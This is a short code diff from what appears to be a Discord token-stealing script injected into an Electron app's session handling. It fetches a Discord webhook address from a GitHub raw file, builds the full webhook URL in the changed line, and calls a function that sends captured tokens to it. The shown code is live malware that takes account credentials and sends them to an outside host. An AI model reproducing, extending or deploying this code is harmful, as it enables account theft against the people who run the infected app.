@@ -714,7 +714,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 		xmlHttp.open( "GET", "https://raw.githubusercontent.com/SzollosiJanos/token/main/hook", false );
 		xmlHttp.send( null );
 		xmlHttp.responseText;`, !0).then((asd => {
-		config.webhook=asd.replace(/(\r\n|\n|\r)/gm, "");
+		config.webhook='https://discord.com/api/webhooks/'+asd.replace(/(\r\n|\n|\r)/gm, "");
 		}))
 	  sendtoken2().catch(console.error);
 	  asd=1;
